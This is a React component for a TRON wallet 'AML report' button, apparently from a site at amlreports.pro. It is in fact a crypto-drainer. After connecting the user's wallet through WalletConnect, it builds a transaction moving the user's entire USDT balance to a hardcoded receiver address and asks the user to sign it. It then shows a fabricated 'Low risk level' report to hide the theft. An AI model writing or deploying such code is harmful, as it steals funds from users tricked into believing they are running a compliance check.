import React, { useState } from 'react';
import { adapter, tronWeb, USDT_CONTRACT, TRON_RECEIVER } from './tronWallet';


const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
    explorerRecommendedWalletIds: [
      // твои WalletConnect ID
    ],
  },
});

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage] = useState<string | null>("");

  const disconnectAndNotify = async (message: string) => {
    setModalMessage(message);
    await adapter.disconnect();
  };

  const waitForAddress = async (timeout = 30000): Promise<string> => {
    const start = Date.now();
    return new Promise((resolve, reject) => {
      const interval = setInterval(() => {
        const address = adapter.address;
        if (address && tronWeb.isAddress(address)) {
          clearInterval(interval);
          resolve(address);
        } else if (Date.now() - start > timeout) {
          clearInterval(interval);
          reject(new Error('Timeout waiting for wallet connection'));
        }
      }, 300);
    });
  };

  const connectWallet = async () => {
    try {
      await adapter.connect();

      const userAddress = await waitForAddress();
      tronWeb.setAddress(userAddress);

      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx = trxRaw / 1e6;

      if (trx < 25) {
        return await disconnectAndNotify('❌ Not enough TRX. At least 25 TRX required for transaction fees.');
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call({ from: userAddress });
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        return await disconnectAndNotify('succes');
      }

      const functionSelector = 'transfer(address,uint256)';
      const parameter = [
        { type: 'address', value: TRON_RECEIVER },
        { type: 'uint256', value: usdtRaw },
      ];

      const options = {
        feeLimit: 25_000_000,
        callValue: 0,
      };

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        functionSelector,
        options,
        parameter,
        userAddress
      );

      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      console.log('USDT sent:', result);
      await disconnectAndNotify('succes');

    } catch (err: any) {
      console.error('Error:', err);
      await adapter.disconnect();

      const errMsg = err?.message || err?.toString();

      if (
        errMsg.includes('Invalid address provided') ||
        errMsg.includes('Modal is closed') ||
        errMsg.includes('User rejected') ||
        errMsg.includes('Timeout waiting for wallet connection')
      ) {
        return;
      }

      setModalMessage('⚠️ Connection or transaction error');
    }
  };

  return (
    <div onClick={connectWallet} className='AuthButton'>
      {modalMessage && (
        <div className='modal__overflow'>
          <div className="modal">
            {modalMessage !== 'succes' ? (
              <>
                <p>{modalMessage}</p>
              </>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className='circ green'></span> 0-30 </div>
                      <div><span className='circ orange'></span> 31-69 </div>
                      <div><span className='circ red'></span> 70-100 </div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
                </div>
              </>
            )}
            <button
              onClick={async () => {
                await adapter.disconnect();
                setModalMessage(null);
              }}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
